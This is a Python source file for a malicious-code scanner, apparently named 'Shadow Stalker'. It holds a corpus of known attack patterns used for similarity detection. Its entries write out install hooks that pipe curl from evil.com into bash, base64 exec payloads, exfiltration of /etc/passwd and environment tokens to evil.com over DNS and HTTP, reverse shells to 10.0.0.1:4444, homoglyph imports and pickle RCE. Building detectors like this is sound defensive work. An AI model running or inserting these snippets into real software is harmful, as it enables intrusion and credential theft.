"""
Shadow Stalker — Stage 3: Known Malicious Pattern Corpus

Seed corpus of ~30 canonical malicious code patterns used for similarity
search. Each pattern has a label, category, language, and the actual code
snippet that characterizes the attack.
"""

from __future__ import annotations

KNOWN_PATTERNS: list[dict] = [
    # ── Python: setup.py install hooks ────────────────────────
    {
        "id": "py_setup_install_hook",
        "label": "setup.py custom install command",
        "category": "install_hook",
        "language": "python",
        "severity": "CRITICAL",
        "code": (
            "class PostInstallCommand(install):\n"
            "    def run(self):\n"
            "        install.run(self)\n"
            "        os.system('curl http://evil.com/payload | bash')\n"
        ),
    },
    {
        "id": "py_setup_develop_hook",
        "label": "setup.py custom develop command",
        "category": "install_hook",
        "language": "python",
        "severity": "CRITICAL",
        "code": (
            "class PostDevelopCommand(develop):\n"
            "    def run(self):\n"
            "        develop.run(self)\n"
            "        exec(base64.b64decode(PAYLOAD))\n"
        ),
    },

    # ── Python: eval/exec obfuscation ─────────────────────────
    {
        "id": "py_b64_exec",
        "label": "Base64-encoded exec payload",
        "category": "dynamic_execution",
        "language": "python",
        "severity": "CRITICAL",
        "code": "exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgLi4uJyk='))",
    },
    {
        "id": "py_eval_compile",
        "label": "eval(compile(...)) obfuscation",
        "category": "dynamic_execution",
        "language": "python",
        "severity": "CRITICAL",
        "code": "eval(compile(base64.b64decode(data), '<string>', 'exec'))",
    },
    {
        "id": "py_concat_eval",
        "label": "String concatenation to build eval argument",
        "category": "dynamic_execution",
        "language": "python",
        "severity": "HIGH",
        "code": "eval('__imp' + 'ort__' + \"('os')\" + '.sys' + 'tem(cmd)')",
    },
    {
        "id": "py_chr_obfuscation",
        "label": "chr() obfuscation to build function names",
        "category": "dynamic_execution",
        "language": "python",
        "severity": "HIGH",
        "code": "getattr(__builtins__, ''.join([chr(101),chr(118),chr(97),chr(108)]))(payload)",
    },
    {
        "id": "py_dunder_import",
        "label": "__import__ dynamic import",
        "category": "obfuscated_import",
        "language": "python",
        "severity": "HIGH",
        "code": "__import__('subprocess').check_output(['whoami'])",
    },

    # ── Python: hidden execution contexts ─────────────────────
    {
        "id": "py_except_exec",
        "label": "Dangerous call in bare except handler",
        "category": "hidden_execution",
        "language": "python",
        "severity": "CRITICAL",
        "code": (
            "try:\n"
            "    x = 1/0\n"
            "except:\n"
            "    exec(base64.b64decode(payload))\n"
        ),
    },
    {
        "id": "py_atexit_payload",
        "label": "atexit handler with payload",
        "category": "hidden_execution",
        "language": "python",
        "severity": "HIGH",
        "code": (
            "import atexit\n"
            "def cleanup():\n"
            "    os.system('curl http://evil.com/exfil?data=' + encoded_data)\n"
            "atexit.register(cleanup)\n"
        ),
    },
    {
        "id": "py_del_destructor",
        "label": "__del__ destructor with payload",
        "category": "hidden_execution",
        "language": "python",
        "severity": "CRITICAL",
        "code": (
            "class Backdoor:\n"
            "    def __del__(self):\n"
            "        exec(self._encoded_payload)\n"
        ),
    },

    # ── Python: data exfiltration ─────────────────────────────
    {
        "id": "py_dns_exfil",
        "label": "DNS-based data exfiltration",
        "category": "exfiltration",
        "language": "python",
        "severity": "CRITICAL",
        "code": (
            "import socket\n"
            "data = base64.b64encode(open('/etc/passwd').read().encode())\n"
            "socket.getaddrinfo(data.decode() + '.evil.com', 80)\n"
        ),
    },
    {
        "id": "py_env_exfil",
        "label": "Environment variable exfiltration",
        "category": "exfiltration",
        "language": "python",
        "severity": "HIGH",
        "code": (
            "import os, requests\n"
            "tokens = {k: v for k, v in os.environ.items() if 'TOKEN' in k or 'KEY' in k}\n"
            "requests.post('https://evil.com/collect', json=tokens)\n"
        ),
    },

    # ── Python: reverse shells ────────────────────────────────
    {
        "id": "py_reverse_shell",
        "label": "Python reverse shell",
        "category": "reverse_shell",
        "language": "python",
        "severity": "CRITICAL",
        "code": (
            "import socket,subprocess,os\n"
            "s=socket.socket()\n"
            "s.connect(('10.0.0.1',4444))\n"
            "os.dup2(s.fileno(),0)\n"
            "subprocess.call(['/bin/sh','-i'])\n"
        ),
    },

    # ── JavaScript: npm install hooks ─────────────────────────
    {
        "id": "js_preinstall",
        "label": "npm preinstall script with command execution",
        "category": "install_hook",
        "language": "javascript",
        "severity": "CRITICAL",
        "code": '"preinstall": "node -e \\"require(\'child_process\').exec(\'curl http://evil.com | sh\')\\""',
    },
    {
        "id": "js_postinstall",
        "label": "npm postinstall reverse shell",
        "category": "install_hook",
        "language": "javascript",
        "severity": "CRITICAL",
        "code": (
            '"postinstall": "node -e \\"const{exec}=require(\'child_process\');\n'
            'exec(\'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\')\\""'
        ),
    },

    # ── JavaScript: eval / Function obfuscation ───────────────
    {
        "id": "js_eval_atob",
        "label": "eval(atob(...)) base64 execution",
        "category": "dynamic_execution",
        "language": "javascript",
        "severity": "CRITICAL",
        "code": "eval(atob('cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImN1cmwgLi4uIik='))",
    },
    {
        "id": "js_function_constructor",
        "label": "new Function() dynamic code execution",
        "category": "dynamic_execution",
        "language": "javascript",
        "severity": "HIGH",
        "code": "new Function(Buffer.from(encoded, 'base64').toString())()",
    },
    {
        "id": "js_child_process",
        "label": "child_process exec with external command",
        "category": "code_execution",
        "language": "javascript",
        "severity": "HIGH",
        "code": "require('child_process').exec('curl http://evil.com/payload.sh | bash')",
    },
    {
        "id": "js_process_exit",
        "label": "process.on exit handler with payload",
        "category": "hidden_execution",
        "language": "javascript",
        "severity": "HIGH",
        "code": (
            "process.on('exit', () => {\n"
            "  require('child_process').execSync('curl http://evil.com/exfil');\n"
            "});\n"
        ),
    },

    # ── JavaScript: DNS exfiltration ──────────────────────────
    {
        "id": "js_dns_exfil",
        "label": "DNS-based data exfiltration via Node.js",
        "category": "exfiltration",
        "language": "javascript",
        "severity": "CRITICAL",
        "code": (
            "const dns = require('dns');\n"
            "const data = Buffer.from(JSON.stringify(process.env)).toString('hex');\n"
            "dns.resolve(data.slice(0,60) + '.evil.com', () => {});\n"
        ),
    },

    # ── Go: exec.Command patterns ─────────────────────────────
    {
        "id": "go_exec_command",
        "label": "os/exec.Command with shell",
        "category": "code_execution",
        "language": "go",
        "severity": "HIGH",
        "code": 'exec.Command("/bin/sh", "-c", payload).Run()',
    },
    {
        "id": "go_init_backdoor",
        "label": "init() function with hidden execution",
        "category": "hidden_execution",
        "language": "go",
        "severity": "CRITICAL",
        "code": (
            "func init() {\n"
            '    exec.Command("bash", "-c", decoded).Start()\n'
            "}\n"
        ),
    },

    # ── Rust: Command::new patterns ───────────────────────────
    {
        "id": "rs_command_exec",
        "label": "Command::new with shell execution",
        "category": "code_execution",
        "language": "rust",
        "severity": "HIGH",
        "code": 'Command::new("sh").arg("-c").arg(&payload).output()',
    },
    {
        "id": "rs_build_script",
        "label": "build.rs with command execution",
        "category": "install_hook",
        "language": "rust",
        "severity": "CRITICAL",
        "code": (
            "fn main() {\n"
            '    std::process::Command::new("curl")\n'
            '        .arg("http://evil.com/payload")\n'
            "        .output()\n"
            "        .expect(\"failed\");\n"
            "}\n"
        ),
    },

    # ── Unicode homoglyph attacks ─────────────────────────────
    {
        "id": "homoglyph_function",
        "label": "Cyrillic homoglyph in function name",
        "category": "homoglyph",
        "language": "python",
        "severity": "CRITICAL",
        "code": "def \u043erganize_data():\n    # Cyrillic 'о' in 'organize'\n    exec(payload)\n",
    },
    {
        "id": "homoglyph_import",
        "label": "Cyrillic homoglyph in module name",
        "category": "homoglyph",
        "language": "python",
        "severity": "CRITICAL",
        "code": "import \u043es  # Cyrillic 'о' instead of Latin 'o' in 'os'\n",
    },

    # ── Pickle deserialization ────────────────────────────────
    {
        "id": "py_pickle_rce",
        "label": "Pickle deserialization RCE",
        "category": "deserialization",
        "language": "python",
        "severity": "CRITICAL",
        "code": (
            "import pickle, base64\n"
            "payload = base64.b64decode(encoded_data)\n"
            "pickle.loads(payload)\n"
        ),
    },
]


def get_patterns_by_language(language: str) -> list[dict]:
    """Return known patterns filtered by language."""
    lang = language.lower()
    return [p for p in KNOWN_PATTERNS if p["language"] == lang]


def get_patterns_by_category(category: str) -> list[dict]:
    """Return known patterns filtered by category."""
    return [p for p in KNOWN_PATTERNS if p["category"] == category]


def get_all_pattern_codes() -> list[str]:
    """Return just the code strings for all patterns (for embedding)."""
    return [p["code"] for p in KNOWN_PATTERNS]


def get_pattern_by_id(pattern_id: str) -> dict | None:
    """Look up a single pattern by its ID."""
    for p in KNOWN_PATTERNS:
        if p["id"] == pattern_id:
            return p
    return None
